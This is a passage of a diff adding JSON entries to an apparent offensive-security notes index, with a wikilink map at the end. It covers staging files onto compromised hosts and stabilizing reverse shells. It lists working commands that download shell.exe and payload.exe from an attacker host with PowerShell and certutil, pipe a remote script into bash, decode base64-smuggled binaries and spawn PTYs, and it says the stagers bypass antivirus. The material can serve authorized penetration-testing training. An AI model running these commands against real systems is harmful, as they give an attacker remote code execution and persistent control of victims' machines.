+      "id": "11-file-transfers-master",
+      "title": "11. Offensive File Transfers Across Restricted Networks",
+      "titleEn": "11. Offensive File Transfers Across Restricted Networks",
+      "category": "08 File Transfers & Exfiltration",
+      "categoryOrder": 8,
+      "order": 11,
+      "rawCategory": "08 File Transfers & Exfiltration",
+      "subCategory": "08.1 File Ingestion",
+      "tags": [
+        "file-transfer",
+        "download",
+        "powershell",
+        "certutil",
+        "smb",
+        "curl",
+        "base64"
+      ],
+      "difficulty": "Core",
+      "stage": "Staging",
+      "tools": [
+        "python",
+        "powershell",
+        "certutil",
+        "impacket",
+        "curl"
+      ],
+      "summary": "Reliable stagers and file transfer techniques for Windows and Linux hosts with egress restrictions.",
+      "enSummary": "Reliable stagers and file transfer techniques for Windows and Linux hosts with egress restrictions.",
+      "commands": [
+        "python3 -m http.server 8000",
+        "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:8000/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe\"",
+        "certutil -urlcache -split -f http://{LHOST}:8000/payload.exe C:\\Temp\\payload.exe",
+        "sudo impacket-smbserver share $(pwd) -smb2support",
+        "net use Z: \\\\{LHOST}\\share /user:guest \"\" && copy Z:\\tool.exe C:\\Temp\\tool.exe",
+        "cat file.bin | base64 -w 0",
+        "[IO.File]::WriteAllBytes(\"C:\\Temp\\tool.exe\", [Convert]::FromBase64String(\"BASE64_STRING\"))",
+        "curl -sSL http://{LHOST}:8000/script.sh | bash"
+      ],
+      "relPath": "08 File Transfers & Exfiltration/08.1 File Ingestion/11. Offensive File Transfers Across Restricted Networks.md",
+      "filename": "11. Offensive File Transfers Across Restricted Networks.md",
+      "outgoingWikilinks": [
+        "05. Windows Local Privilege Escalation & LOLBAS",
+        "04. Linux Privilege Escalation Master Guide"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 11. Offensive File Transfers Across Restricted Networks\n\n> [!NOTE]\n> Dropping binaries on target hosts requires resilient stagers that bypass antivirus and network inspection.\n\n## 1. Hosting Files on Attacker\n```bash\npython3 -m http.server 8000\nsudo impacket-smbserver share $(pwd) -smb2support\n```\n\n## 2. Windows Downloads\n- **PowerShell WebClient**:\n  ```powershell\n  powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:8000/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe\"\n  ```\n- **Certutil (Built-in LOLBAS)**:\n  ```cmd\n  certutil -urlcache -split -f http://{LHOST}:8000/payload.exe C:\\Temp\\payload.exe\n  ```\n\n## 3. Base64 Pipe (Zero Network Transfers)\n- **Encode on Attacker**:\n  ```bash\n  cat binary.exe | base64 -w 0\n  ```\n- **Decode in PowerShell**:\n  ```powershell\n  [IO.File]::WriteAllBytes(\"C:\\Temp\\tool.exe\", [Convert]::FromBase64String(\"BASE64_STRING\"))\n  ```\n\n> [!TIP]\n> Downloaded tools enable privilege escalation in [[04. Linux Privilege Escalation Master Guide]] and [[05. Windows Local Privilege Escalation & LOLBAS]].\n"
+    },
+    {
+      "id": "12-tty-stabilization-shells",
+      "title": "12. Interactive TTY Stabilization & Terminal Spawning",
+      "titleEn": "12. Interactive TTY Stabilization & Terminal Spawning",
+      "category": "09 Post-Exploitation & Shells",
+      "categoryOrder": 9,
+      "order": 12,
+      "rawCategory": "09 Post-Exploitation & Shells",
+      "subCategory": "09.1 TTY Stabilization",
+      "tags": [
+        "tty",
+        "pty",
+        "shell",
+        "stty",
+        "python",
+        "terminal",
+        "socat"
+      ],
+      "difficulty": "Core",
+      "stage": "Foothold",
+      "tools": [
+        "python",
+        "stty",
+        "script",
+        "socat"
+      ],
+      "summary": "Stabilizing non-interactive reverse shells into fully featured TTY sessions with tab-completion and terminal window resize support.",
+      "enSummary": "Stabilizing non-interactive reverse shells into fully featured TTY sessions with tab-completion and terminal window resize support.",
+      "commands": [
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "stty raw -echo; fg",
+        "export TERM=xterm-256color; stty rows 38 columns 140",
+        "script -qc /bin/bash /dev/null",
+        "socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}"
+      ],
+      "relPath": "09 Post-Exploitation & Shells/09.1 TTY Stabilization/12. Interactive TTY Stabilization & Terminal Spawning.md",
+      "filename": "12. Interactive TTY Stabilization & Terminal Spawning.md",
+      "outgoingWikilinks": [
+        "04. Linux Privilege Escalation Master Guide",
+        "03. Web Application Exploitation & Injection"
+      ],
+      "backlinks": [],
+      "rawMarkdown": "# 12. Interactive TTY Stabilization & Terminal Spawning\n\n> [!IMPORTANT]\n> Raw reverse shells lack arrow key navigation, tab autocompletion, job control (`Ctrl+C`), and editor support. Stabilizing the shell is crucial before running interactive commands like `sudo` or `su`.\n\n## 1. The Standard Python + stty Technique\n1. **Spawn pseudo-terminal in remote shell**:\n   ```bash\n   python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n   ```\n2. **Background the shell**:\n   Press `Ctrl+Z`.\n3. **Configure local terminal and bring shell to foreground**:\n   ```bash\n   stty raw -echo; fg\n   ```\n4. **Export terminal environment and window dimensions**:\n   ```bash\n   export TERM=xterm-256color\n   stty rows 38 columns 140\n   ```\n\n## 2. Alternative: Using `script`\nIf Python is not installed on the victim:\n```bash\nscript -qc /bin/bash /dev/null\n# Then Ctrl+Z -> stty raw -echo; fg\n```\n\n> [!TIP]\n> After establishing a stable interactive TTY, proceed with [[04. Linux Privilege Escalation Master Guide]].\n"
+    }
+  ],
+  "wikilinkMap": {
+    "01. network discovery & port scanning guide": "01-recon-port-scanning",
+    "01-recon-port-scanning": "01-recon-port-scanning",
+    "network discovery & port scanning guide": "01-recon-port-scanning",
+    "02. web content discovery & directory fuzzing": "02-web-directory-fuzzing",
+    "02-web-directory-fuzzing": "02-web-directory-fuzzing",
+    "web content discovery & directory fuzzing": "02-web-directory-fuzzing",
+    "03. web application exploitation & injection": "03-web-exploitation-injection",
+    "03-web-exploitation-injection": "03-web-exploitation-injection",
+    "web application exploitation & injection": "03-web-exploitation-injection",
+    "04. linux privilege escalation master guide": "04-linux-privesc-master",
+    "04-linux-privesc-master": "04-linux-privesc-master",
+    "linux privilege escalation master guide": "04-linux-privesc-master",
+    "05. windows local privilege escalation & lolbas": "05-windows-privesc-lolbas",
+    "05-windows-privesc-lolbas": "05-windows-privesc-lolbas",
+    "windows local privilege escalation & lolbas": "05-windows-privesc-lolbas",
+    "06. active directory attack paths & domain enumeration": "06-ad-attack-paths-enum",
+    "06-ad-attack-paths-enum": "06-ad-attack-paths-enum",
+    "active directory attack paths & domain enumeration": "06-ad-attack-paths-enum",
+    "07. kerberos exploitation: as-rep & kerberoasting": "07-kerberos-attacks-master",
+    "07-kerberos-attacks-master": "07-kerberos-attacks-master",
+    "kerberos exploitation: as-rep & kerberoasting": "07-kerberos-attacks-master",
+    "08. active directory certificate services (ad cs) abuse": "08-adcs-certipy-abuse",
+    "08-adcs-certipy-abuse": "08-adcs-certipy-abuse",
+    "active directory certificate services (ad cs) abuse": "08-adcs-certipy-abuse",
+    "09. pivoting, tunnels & lateral movement": "09-pivoting-tunnels-master",
+    "09-pivoting-tunnels-master": "09-pivoting-tunnels-master",
+    "pivoting, tunnels & lateral movement": "09-pivoting-tunnels-master",
+    "10. password cracking & hash identification": "10-password-cracking-hashcat",
+    "10-password-cracking-hashcat": "10-password-cracking-hashcat",
+    "password cracking & hash identification": "10-password-cracking-hashcat",
+    "11. offensive file transfers across restricted networks": "11-file-transfers-master",
+    "11-file-transfers-master": "11-file-transfers-master",
+    "offensive file transfers across restricted networks": "11-file-transfers-master",
+    "12. interactive tty stabilization & terminal spawning": "12-tty-stabilization-shells",
+    "12-tty-stabilization-shells": "12-tty-stabilization-shells",
+    "interactive tty stabilization & terminal spawning": "12-tty-stabilization-shells"
+  }
+}
